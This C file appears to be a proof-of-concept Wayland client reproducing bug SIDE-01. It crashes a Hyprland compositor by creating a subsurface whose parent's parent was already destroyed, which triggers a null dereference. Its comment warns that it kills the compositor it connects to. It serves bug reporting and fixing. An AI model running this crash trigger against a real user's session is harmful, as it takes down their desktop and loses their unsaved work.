#include <stdio.h>
#include <string.h>
#include <wayland-client.h>

/*
 * Client for bug SIDE-01: wl_subcompositor.get_subsurface with a parent whose
 * own parent wl_surface was already destroyed. CWLSubsurfaceResource::t1Parent()
 * starts from m_parent.lock() == nullptr and dereferences it unconditionally
 * (Subcompositor.cpp:145) -> compositor main-thread SIGSEGV.
 *
 * WARNING: this takes down the compositor it connects to. Run it in a nested
 * or throwaway session only.
 *
 * Baseline: official Hyprland main @ e2ad066c9.
 */

static struct wl_compositor*    compo;
static struct wl_subcompositor* subcompo;

static void reg_global(void* d, struct wl_registry* r, uint32_t n, const char* iface, uint32_t ver) {
    (void)d;
    (void)ver;
    if (!strcmp(iface, "wl_compositor"))
        compo = wl_registry_bind(r, n, &wl_compositor_interface, 4);
    else if (!strcmp(iface, "wl_subcompositor"))
        subcompo = wl_registry_bind(r, n, &wl_subcompositor_interface, 1);
}

static void reg_remove(void* d, struct wl_registry* r, uint32_t n) {
    (void)d;
    (void)r;
    (void)n;
}

static const struct wl_registry_listener reg_listener = {reg_global, reg_remove};

int main(void) {
    struct wl_display* dpy = wl_display_connect(NULL);
    if (!dpy) {
        fprintf(stderr, "cannot connect to a Wayland display\n");
        return 1;
    }

    struct wl_registry* reg = wl_display_get_registry(dpy);
    wl_registry_add_listener(reg, &reg_listener, NULL);
    wl_display_roundtrip(dpy);
    if (!compo || !subcompo) {
        fprintf(stderr, "wl_compositor / wl_subcompositor missing\n");
        return 1;
    }

    struct wl_surface* a = wl_compositor_create_surface(compo);
    struct wl_surface* b = wl_compositor_create_surface(compo);
    struct wl_surface* c = wl_compositor_create_surface(compo);

    wl_subcompositor_get_subsurface(subcompo, b, a); /* B is a subsurface of A */
    wl_surface_destroy(a);                           /* A dies, B keeps its wl_subsurface and role */
    wl_display_roundtrip(dpy);
    printf("[*] parent destroyed, B is now an orphaned subsurface\n");

    wl_subcompositor_get_subsurface(subcompo, c, b); /* t1Parent() of B derefs the dead A */
    int ret = wl_display_roundtrip(dpy);
    printf("[*] roundtrip returned %d (a crashed compositor shows up as a connection error)\n", ret);
    return 0;
}
